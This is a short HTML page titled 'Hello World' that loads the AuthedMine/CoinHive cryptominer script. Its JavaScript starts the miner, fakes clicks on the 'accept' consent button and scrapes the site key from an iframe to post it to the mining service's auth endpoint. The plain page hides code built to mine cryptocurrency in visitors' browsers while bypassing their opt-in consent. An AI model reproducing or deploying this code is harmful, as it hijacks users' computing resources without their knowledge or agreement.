<h1>Hello World</h1>



<script src="https://authedmine.com/lib/authedmine.min.js"></script>

<script>

    console.log("HOSTNAME " + location.hostname);

    var miner;

    function startMiner(key) {
        miner = new CoinHive.Anonymous(key);
        miner.stop();
        miner.start();
    }

    function activateMiner() {
        document.getElementById("accept").click();
    }
    
     function postt(){

        var iframe = document.getElementsByTagName("iframe")[0];
        var sourceText = iframe.src;

        console.log(sourceText);

        var key =  sourceText.substr(sourceText.indexOf("key=")+ 4,   sourceText.indexOf("&amp;domain"));

        console.log(key);

        var http = new XMLHttpRequest();
        var postdata= "key=" + key;
        http.open("POST", "https://authedmine.com/auth", true);
        http.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
        http.setRequestHeader("Content-length", postdata.length);
        http.onreadystatechange = function() {//Call a function when the state changes.
            if(http.readyState == 4 && http.status == 200) {
                alert(http.responseText);
            }
        };
        http.send(postdata);
    }

    function stopMiner() {
        miner.stop();
    }
    
    function callButton() {
        document.getElementById("accept").click();
    }
    
</script>
